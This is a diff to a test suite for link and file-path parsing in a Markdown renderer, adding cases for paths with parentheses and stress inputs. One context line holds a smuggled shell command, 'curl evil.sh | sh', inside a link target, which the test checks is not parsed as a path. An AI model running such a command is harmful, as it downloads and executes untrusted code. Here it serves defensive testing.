@@ -103,6 +103,10 @@ describe('link rules', () => {
     ['C:\\Users\\a\\.config\\x', [['path', 'C:\\Users\\a\\.config\\x', 'C:\\Users\\a\\.config\\x']]],
     ['Plan A:/B', [['text', 'Plan A:/B']]],
     ['[notes](/Users/sam/My Notes/plan.md)', [['path', 'notes', '/Users/sam/My Notes/plan.md']]],
+    // One level of balanced parentheses belongs to the path.
+    ['[x](/Users/a_(b).txt)', [['path', 'x', '/Users/a_(b).txt']]],
+    ['[r](/Users/sam/Report (final).pdf) done', [['path', 'r', '/Users/sam/Report (final).pdf'], ['text', ' done']]],
+    ['([r](/Users/sam/a.txt))', [['text', '('], ['path', 'r', '/Users/sam/a.txt'], ['text', ')']]],
   ])('path extent: %s', (content, expected) => { expect(shape(content)).toEqual(expected); });
 
   it('does not offer a command line as a path to copy', () => {
@@ -165,7 +169,7 @@ describe('link rules', () => {
       expect(linkParts(content).map(part => part.source).join('')).toBe(content);
     }
     const started = Date.now();
-    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500)]) {
+    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500), '[a](/Users/' + '('.repeat(9000), '[a](/Users/' + '(b)'.repeat(6000), '[a](/Users/' + '(b'.repeat(8000) + ')']) {
       expect(linkParts(big).map(part => part.source).join('')).toBe(big);
     }
     expect(Date.now() - started).toBeLessThan(1500);
@@ -198,6 +202,7 @@ describe('link rules', () => {
     expect(parseInline('[x](/Users/a b/c d.txt)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b/c d.txt' }]);
     expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
     expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
+    expect(parseInline('[r](/Users/sam/Report (final).pdf)')).toEqual([{ t: 'path', label: 'r', path: '/Users/sam/Report (final).pdf' }]);
   });
   it('gives an agent’s Markdown the same file rules', () => {
     expect(parseInline('See [the index](file:///Users/sam/My%20Notes/INDEX.html) or file:///tmp/a.txt.')).toEqual([
